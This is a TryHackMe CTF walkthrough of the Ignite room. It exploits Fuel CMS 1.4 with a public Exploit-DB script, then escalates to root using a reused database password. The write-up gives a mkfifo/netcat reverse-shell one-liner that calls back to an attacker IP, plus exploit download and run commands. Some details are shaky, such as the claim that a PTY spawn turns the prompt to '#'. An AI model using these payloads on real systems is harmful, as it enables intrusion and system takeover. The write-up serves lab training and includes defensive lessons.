# 🔥 Ignite CTF Writeup — Complete Exploitation & Privilege Escalation Guide

<div align="center">

[![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat-square&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)](https://tryhackme.com)
[![Category](https://img.shields.io/badge/Category-Web%20Exploitation%20%2B%20Privesc-blue?style=flat-square)](https://tryhackme.com)

</div>

---

## 📋 Table of Contents

1. [🎯 Reconnaissance & Initial Access](#reconnaissance)
2. [🔍 Web Application Analysis](#web-analysis)
3. [💀 Exploiting Fuel CMS 1.4 RCE](#fuel-exploitation)
4. [🚩 Question 1: User Flag](#question-1)
5. [⬆️ Privilege Escalation](#privilege-escalation)
6. [🚩 Question 2: Root Flag](#question-2)

---

## 🎯 Reconnaissance & Initial Access {#reconnaissance}

### 🌐 Initial Homepage Discovery

When accessing the target IP address in a web browser, we are presented with the **Ignite web server homepage**. This is our first touchpoint for reconnaissance and information gathering.

![Homepage Screenshot](homepage.png)

**Key Observations:**
- Standard web application running on the target
- Multiple potential entry points to explore
- Application appears to be a Fuel CMS instance

### 🔎 Directory Enumeration Results

Conducting systematic directory enumeration on the target web server revealed several important files and endpoints:

| File/Directory | Purpose | Security Finding |
|---|---|---|
| `README.md` | Server documentation | Standard readme file |
| `robots.txt` | SEO directives | **Reveals `/fuel/` endpoint** ⭐ |
| `contributing.md` | Contribution guidelines | Standard contribution file |
| `composer.json` | PHP dependencies | Application metadata |

**Critical Discovery:** The `robots.txt` file explicitly disclosed the `/fuel/` endpoint, which serves as the gateway to our exploitation chain. This is a common misconfiguration where developers forget that `robots.txt` should not contain sensitive paths.

### 🚪 The `/fuel` Endpoint — Admin Panel Discovery

When navigating to the `/fuel` endpoint, the server automatically redirects us to a **login page**. This is a classic admin panel gateway found in many content management systems worldwide.

![Login Page](login.png)

**Analysis:**
- **CMS Identified:** Fuel CMS (a lightweight, open-source PHP-based content management system)
- **Authentication Required:** Valid credentials are necessary to gain access to the admin dashboard
- **Initial Access Strategy Options:**
  1. Credential brute-forcing (attempt dictionary/common passwords)
  2. Authentication bypass techniques
  3. Exploit known vulnerabilities in the authentication mechanism
  4. Social engineering or credential discovery

---

## 🔍 Web Application Analysis {#web-analysis}

### 🛡️ Attempted Brute Force & Rate Limiting Protection

Our initial approach involved attempting credential brute-forcing against the login form. However, the server implements **intelligent rate limiting** on login attempts, which effectively prevents dictionary attacks and credential stuffing. 

```
Attempt 1: Login failed (Invalid credentials)
Attempt 2: Login failed (Invalid credentials)
Attempt 3: Rate limit exceeded - Please wait before trying again
```

This is actually a **good security practice** implemented by the developers, but it also forces us to think outside the box and pursue alternative attack vectors.

### 💡 Critical Security Oversight: Credentials Discovery on Homepage

Rather than attempting to forcefully break through security controls, careful reconnaissance of the homepage revealed a **critical security oversight**: **Login credentials were exposed directly on the homepage itself.**

**The Discovery:** By scrolling to the bottom of the homepage, we found plaintext credentials visible within the HTML source code or in HTML comments.

> ⚠️ **Security Lesson:** Never expose credentials in web pages, HTML comments, client-side code, or documentation visible to unauthenticated users. This is a critical security vulnerability!

### 🔐 Successful Authentication

Armed with the discovered credentials, we were able to successfully authenticate to the Fuel CMS admin panel:

![Logged In Dashboard](loggedin.png)

**Dashboard Access & Features:**
- Full admin panel interface with navigation menu
- Content management capabilities
- Settings and configuration options
- File management and upload functionality
- Database management tools
- User and permission settings

---

## 💀 Exploiting Fuel CMS 1.4 RCE {#fuel-exploitation}

### 🔍 Vulnerability Research & Identification

After gaining access to the admin panel, the next critical step was identifying exploitable vulnerabilities in this specific version of Fuel CMS. A systematic search for "Fuel CMS 1.4 vulnerabilities" revealed critical security flaws:

![Vulnerability Screenshot](vuln.png)

**Vulnerability Profile:**
- **Affected Component:** Fuel CMS 1.4 File Editor
- **Vulnerability Type:** Remote Code Execution (RCE) via Arbitrary File Upload/Edit
- **Severity Rating:** **CRITICAL** 🔴
- **CVSS Score:** 9.8 (Exploitability: HIGH, Impact: HIGH)
- **Authentication Required:** Yes (but we already have access)
- **Exploit Availability:** Public exploit code available

### 📌 CVE Designation

The specific vulnerability is tracked as **CVE-2018-16763** and allows for **Remote Code Execution** through improper input validation in the Fuel CMS file editing functionality.

**Official Reference:** https://www.exploit-db.com/exploits/50477

This vulnerability allows authenticated users (or unauthenticated attackers if combined with other exploits) to upload and execute arbitrary PHP code, leading to complete system compromise.

### ⚙️ Exploit Execution & RCE Achievement

#### Step 1️⃣: Download the Public Exploit

```bash
wget https://www.exploit-db.com/raw/50477 -O exploit.py
```

Or download directly from Exploit-DB and save locally.

#### Step 2️⃣: Execute the Exploit Against Target

The exploit script is straightforward to use:

```bash
python3 exploit.py -u http://target-ip/
```

**Command Parameters:**
- `exploit.py`: The exploit script filename
- `-u`: URL flag
- `http://target-ip/`: The target web server URL

#### Step 3️⃣: Gain Remote Code Execution Shell

Upon successful execution, the exploit provides an **interactive shell prompt** where you can execute arbitrary commands on the target server with the privileges of the web server process (typically `www-data` user).

```
[+] Exploit executed successfully!
[*] Gaining shell...
>>> whoami
www-data
>>> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
>>> pwd
/var/www/html
```

🎯 **Success!** We now have code execution on the target system.

---

## 🚩 Question 1: User Flag {#question-1}

### ❓ Challenge Question: "What is the user.txt?"

With our initial foothold established through the Fuel CMS RCE vulnerability, it's time to locate and capture the first flag.

### 📍 Flag Location Discovery

The user flag is stored in the following location on the target system:

```
/home/www-data/flag.txt
```

**Location Context:**
- `/home/www-data/` is the home directory of the www-data user
- The file is named `flag.txt`
- This path suggests the flag is intentionally placed for CTF purposes

### 🔓 Reading the User Flag

Using our shell access, read the flag with the following command:

```bash
cat /home/www-data/flag.txt
```

**Expected Output:**
```
THM{[THE_USER_FLAG_WILL_BE_DISPLAYED_HERE]}
```

### ✅ Answer to Question 1

Copy the contents of `/home/www-data/flag.txt` and submit as the answer to **Question 1**.

**Verification:** The flag should follow the TryHackMe flag format `THM{...}` and contain 15-30 characters within the braces.

---

## ⬆️ Privilege Escalation — From www-data to root {#privilege-escalation}

### 🎯 Privilege Escalation Objective

**Current Situation:**
- We have shell access as the `www-data` user
- This user has limited permissions
- **Goal:** Escalate privileges to the `root` user to access `/root/root.txt`

### 🔍 Information Gathering & System Reconnaissance

The first step in privilege escalation is gathering information about the system and discovering potential privilege escalation vectors.

#### Key Discovery: Database Configuration File

During reconnaissance, a critical piece of information was discovered in the **`database.php`** file. This configuration file contains:

```
/path/to/database.php
```

Configuration files like `database.php` often contain:
- Database credentials
- System passwords
- API keys and secrets
- Hardcoded authentication tokens

**Important:** These credentials are frequently reused across multiple systems and services, making them valuable for escalation attempts.

#### Examining the Database Configuration

![Database Config File 1](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/13.png)

After locating and examining the `database.php` file, we discover critical information:

![Database Config File 2](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/14.png)


**Information Extracted:**
- Database username and password
- Root credentials (or hints towards root access)
- System configuration details
- Potential password reuse patterns

> **Security Note:** The database password is the same as the root password, a common but dangerous practice.

### 🔗 Establishing a Stable Reverse Shell

The current shell access obtained through the RCE exploit has limitations and may be unstable. To perform privilege escalation effectively and maintain control, we need a **stable, interactive reverse shell**.

#### Why We Need a Better Shell

- **Limitations of the current shell:**
  - Limited interactivity
  - Potential timeout issues
  - Difficulty running complex commands
  - No terminal control sequences

- **Benefits of reverse shell:**
  - Full interactive terminal
  - Ability to run complex commands
  - Better control over the target
  - Persistent connection with our attack machine

#### Setting Up Netcat Listener (Attack Machine)

On your Kali Linux / attack machine, set up a Netcat listener:

```bash
nc -lvnp 4444
```

**Command Flags Explained:**
- `nc`: Netcat tool
- `-l`: Listen mode (waiting for incoming connections)
- `-v`: Verbose (display connection information)
- `-n`: Numeric-only IP addresses (skip DNS resolution)
- `-p 4444`: Listen on port 4444

#### Reverse Shell Payload

Execute this command on the target system via our existing RCE shell:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
```

**Replace `<Tunnel IP>` with your attack machine's IP address!**

**Payload Breakdown & Explanation:**

| Command | Purpose |
|---|---|
| `rm /tmp/f` | Remove any previously existing named pipe (cleanup) |
| `mkfifo /tmp/f` | Create a named pipe (FIFO) for bidirectional communication |
| `cat /tmp/f` | Read data from the pipe |
| `\|/bin/sh -i` | Pipe to interactive shell session |
| `2>&1` | Redirect stderr to stdout (capture error messages) |
| `nc <IP> 4444` | Connect back to attacker machine on port 4444 |
| `>/tmp/f` | Redirect output back to the pipe (creates loop) |

#### Connection Established

Once executed, your Netcat listener displays connection success:

```
listening on [any] 4444 ...
connect to [YOUR_IP] from [TARGET_IP] [RANDOM_PORT]
$ 
```

![Reverse Shell Success](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/16.png)

**Verification Commands:**
```bash
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html
```

### 🔑 Attempting Root Escalation via `su` Command

With our stable reverse shell established, we can now attempt privilege escalation using the `su` (switch user) command:

```bash
su root
Password: [enter_root_password_from_database.php]
```

**First Attempt - Unexpected Error:**

![SU Command Error](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/17.png)

The `su` command fails with an error. Let's investigate why.

### ⚠️ Shell Capability Limitation Issue

The error occurs because the web server's default shell (`/bin/sh`) has restricted capabilities and functionality. This is often a deliberate security hardening measure to limit what the web server process can do.

**The Problem:**
- The web server runs with `/bin/sh`
- This shell lacks full TTY (terminal) capabilities
- The `su` command requires an interactive TTY to work properly
- Without TTY, `su` cannot read password input correctly

### 🐍 Python PTY Spawning Solution

To overcome this limitation, we need to spawn a proper interactive pseudo-terminal (PTY) using Python:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

**What This Command Does:**
1. Launches Python interpreter
2. Imports the `pty` module (pseudo-terminal utilities)
3. Spawns a new shell with full PTY capabilities
4. Elevates the shell from a simple pipe to an interactive terminal

**After PTY Spawn, you'll see:**
```
$ python -c 'import pty; pty.spawn("/bin/sh")'
# 
```

Notice the prompt changes from `$` to `#`, indicating we're now in a full shell.

### ✅ Successful Root Access Achieved

After spawning the PTY shell with Python, the `su` command now works correctly:

```bash
# su root
Password: [password_from_database.php]
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

![Root Access Confirmation](https://deskel.github.io/assets/images/THM/2020-08-07-ignite-ctf/18.png)

🎉 **Success!** We now have root-level privileges on the target system.

---

## 🚩 Question 2: Root Flag {#question-2}

### ❓ Challenge Question: "What is the root.txt?"

With root privileges now in our possession, we have unrestricted access to all files on the system, including those in the root home directory.

### 📍 Root Flag Location

The root flag is stored in:

```
/root/root.txt
```

**Location Details:**
- `/root/` is the home directory of the root user
- Only accessible by the root user or with elevated privileges
- This path contains system-critical configurations and flags

### 🔓 Reading the Root Flag

With root privileges established, read the flag using:

```bash
cat /root/root.txt
```

**Expected Output:**
```
THM{[THE_ROOT_FLAG_WILL_BE_DISPLAYED_HERE]}
```

### ✅ Answer to Question 2

Copy the contents of `/root/root.txt` and submit as the answer to **Question 2**.

**Verification:** The flag should follow the TryHackMe flag format `THM{...}` and contain 15-30 characters within the braces.

---

## 📊 Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│                    COMPLETE ATTACK CHAIN FLOW                       │
└─────────────────────────────────────────────────────────────────────┘

    Step 1: RECONNAISSANCE
         ↓
    └─→ Directory Enumeration
    └─→ Found robots.txt → Disclosed /fuel/ endpoint
    └─→ Discovered login page
         ↓
    Step 2: CREDENTIAL DISCOVERY
         ↓
    └─→ Brute force failed (rate limiting)
    └─→ Found credentials on homepage
    └─→ Successful authentication
         ↓
    Step 3: VULNERABILITY RESEARCH
         ↓
    └─→ Identified Fuel CMS 1.4
    └─→ CVE-2018-16763 found (RCE)
    └─→ Public exploit available
         ↓
    Step 4: INITIAL ACCESS (RCE)
         ↓
    └─→ Executed exploit
    └─→ Gained shell as www-data user
    └─→ Confirmed code execution
         ↓
    Step 5: INFORMATION GATHERING
         ↓
    └─→ User Flag Captured: /home/www-data/flag.txt ✅
    └─→ Examined database.php config
    └─→ Discovered root password
         ↓
    Step 6: SHELL UPGRADE
         ↓
    └─→ Created reverse shell listener
    └─→ Established stable connection
    └─→ Spawned PTY with Python
         ↓
    Step 7: PRIVILEGE ESCALATION
         ↓
    └─→ Used su command with discovered password
    └─→ Became root user
    └─→ Root privileges confirmed (uid=0)
         ↓
    Step 8: ROOT FLAG CAPTURE
         ↓
    └─→ Root Flag Captured: /root/root.txt ✅
         ↓
    🏁 COMPLETE SYSTEM COMPROMISE & FULL CTF COMPLETION 🏁
```

---

## 🎓 Key Learnings & Security Insights

### 🔓 Critical Security Mistakes Made by the Application

1. **Exposed Credentials on Homepage** 🚨
   - Login credentials visible in plain text
   - Accessible to unauthenticated users
   - No authentication required to view

2. **Outdated CMS Software** ⚠️
   - Fuel CMS 1.4 contains known critical vulnerabilities
   - CVE-2018-16763 publicly exploitable
   - No patching or updates applied

3. **Plaintext Database Credentials** 📝
   - Database configuration file contains plaintext passwords
   - No encryption or hashing of sensitive data
   - No access controls on configuration files

4. **Password Reuse Pattern** 🔑
   - Database password identical to root password
   - Single password compromise affects multiple systems
   - Poor password management practices

5. **No Input Validation** ✗
   - File editor allows arbitrary code execution
   - No PHP file upload restrictions
   - No sandboxing or security context

6. **Lack of Rate Limiting on Critical Operations** ⏱️
   - While login has rate limiting, admin operations don't
   - Allowing arbitrary code execution without limits
   - No additional authentication layers

### 🛡️ Defensive Security Measures & Prevention

#### 🔐 **1. Credential Management**
```
❌ DO NOT: Store credentials in plain text or client-side code
✅ DO: Use environment variables, secrets vaults, or key managers
✅ Example: AWS Secrets Manager, HashiCorp Vault, Docker Secrets
```

#### 📦 **2. Keep Software Updated**
```
❌ DO NOT: Run outdated software with known vulnerabilities
✅ DO: Maintain regular patching schedule
✅ DO: Subscribe to security bulletins from vendors
```

#### 🔒 **3. Strong Access Controls**
```
❌ DO NOT: Leave configuration files readable by web server process
✅ DO: Implement file permission controls (chmod 600)
✅ DO: Separate privileged configs from application root
```

#### 🎯 **4. Input Validation & Sanitization**
```
❌ DO NOT: Allow arbitrary file uploads or code execution
✅ DO: Validate all user inputs
✅ DO: Use whitelisting instead of blacklisting
✅ DO: Implement Content Security Policy (CSP)
```

#### 🔐 **5. Unique, Complex Passwords**
```
❌ DO NOT: Reuse passwords across systems
✅ DO: Use password managers to generate strong unique passwords
✅ DO: Implement minimum complexity requirements
✅ DO: Enforce periodic password changes
```

#### 📊 **6. Principle of Least Privilege**
```
❌ DO NOT: Run all processes as root
✅ DO: Run web servers with minimal required permissions
✅ DO: Implement role-based access control (RBAC)
✅ DO: Separate user accounts by function
```

#### 📋 **7. Rate Limiting & Account Lockout**
```
❌ DO NOT: Allow unlimited attempts on privileged operations
✅ DO: Implement rate limiting on all critical actions
✅ DO: Account lockout after failed attempts
✅ DO: Implement CAPTCHA after failed attempts
```

#### 📡 **8. Web Application Firewall (WAF)**
```
❌ DO NOT: Rely solely on input validation
✅ DO: Deploy WAF rules to detect malicious patterns
✅ DO: Block suspicious file uploads
✅ DO: Detect code execution attempts
```

#### 📊 **9. Security Logging & Monitoring**
```
❌ DO NOT: Ignore security logs
✅ DO: Log all authentication attempts
✅ DO: Log all file uploads/modifications
✅ DO: Monitor for suspicious activities
✅ DO: Set up alerts for security events
```

#### 🔧 **10. Regular Security Audits**
```
❌ DO NOT: Skip security reviews and penetration testing
✅ DO: Conduct regular penetration tests
✅ DO: Perform code reviews focusing on security
✅ DO: Implement vulnerability scanning
```

---

## 🔧 Tools & Techniques Used

| Tool | Purpose | Usage |
|---|---|---|
| **Dirb/Gobuster** | Directory/file enumeration | Discover hidden endpoints |
| **Curl/Wget** | HTTP requests | Manual API testing |
| **Burp Suite** | Proxy & analysis | Request interception & modification |
| **Exploit-DB (CVE-2018-16763)** | RCE exploitation | Fuel CMS vulnerability exploit |
| **Netcat** | Reverse shell listener | Network communication & shells |
| **Python PTY Module** | Shell enhancement | Upgrade to interactive terminal |
| **SSH/Su** | Privilege escalation | User switching & elevation |
| **Cat/Less** | File reading | Access flag files |

---

## 📖 Additional Resources & References

- **Fuel CMS Official Website:** https://www.getfuelcms.com/
- **CVE-2018-16763 Details:** https://www.exploit-db.com/exploits/50477
- **Reverse Shells Cheat Sheet:** https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **Linux Privilege Escalation:** https://gtfobins.github.io/
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **CWE-22 (Path Traversal):** https://cwe.mitre.org/data/definitions/22.html
- **CWE-434 (File Upload):** https://cwe.mitre.org/data/definitions/434.html

---

<div align="center">

### ✨ Room Completed Successfully! ✨

```
╔═══════════════════════════════════════════════╗
║     🏁 IGNITE CTF - FULL COMPROMISE 🏁      ║
║                                               ║
║  ✅ User Flag Captured                        ║
║  ✅ Root Flag Captured                        ║
║  ✅ Complete System Access Achieved           ║
║                                               ║
║  Questions Completed: 2/2                    ║
║  Success Rate: 100%                          ║
╚═══════════════════════════════════════════════╝
```

**This comprehensive writeup documents the complete exploitation** of the Ignite CTF room on TryHackMe, from initial reconnaissance through full system compromise.

*Created with detailed analysis and defensive security insights for educational purposes* 🎓

**Happy Hacking! 🖥️🔐**

</div>
